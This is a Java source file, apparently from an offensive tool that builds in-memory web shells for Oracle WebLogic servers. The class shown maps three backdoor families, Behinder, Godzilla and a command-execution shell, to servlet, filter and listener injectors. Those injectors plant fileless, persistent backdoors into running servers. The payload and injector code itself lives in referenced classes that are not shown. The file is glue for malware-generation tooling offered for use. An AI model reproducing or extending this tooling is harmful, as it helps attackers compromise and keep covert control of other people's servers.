package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderServlet;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandServlet;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaServlet;
import com.reajason.javaweb.memshell.weblogic.behinder.BehinderListener;
import com.reajason.javaweb.memshell.weblogic.command.CommandListener;
import com.reajason.javaweb.memshell.weblogic.godzilla.GodzillaListener;
import com.reajason.javaweb.memshell.weblogic.injector.WebLogicFilterInjector;
import com.reajason.javaweb.memshell.weblogic.injector.WebLogicListenerInjector;
import com.reajason.javaweb.memshell.weblogic.injector.WebLogicServletInjector;
import org.apache.commons.lang3.tuple.Pair;

import java.util.Map;

import static com.reajason.javaweb.memshell.config.Constants.*;

/**
 * @author ReaJason
 * @since 2024/12/24
 */
public class WebLogicShell extends AbstractShell {
    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getBehinderShellMap() {
        return Map.of(
                SERVLET, Pair.of(BehinderServlet.class, WebLogicServletInjector.class),
                FILTER, Pair.of(BehinderFilter.class, WebLogicFilterInjector.class),
                LISTENER, Pair.of(BehinderListener.class, WebLogicListenerInjector.class)
        );
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
        return Map.of(
                SERVLET, Pair.of(CommandServlet.class, WebLogicServletInjector.class),
                FILTER, Pair.of(CommandFilter.class, WebLogicFilterInjector.class),
                LISTENER, Pair.of(CommandListener.class, WebLogicListenerInjector.class)
        );
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getGodzillaShellMap() {
        return Map.of(
                SERVLET, Pair.of(GodzillaServlet.class, WebLogicServletInjector.class),
                FILTER, Pair.of(GodzillaFilter.class, WebLogicFilterInjector.class),
                LISTENER, Pair.of(GodzillaListener.class, WebLogicListenerInjector.class)
        );
    }
}
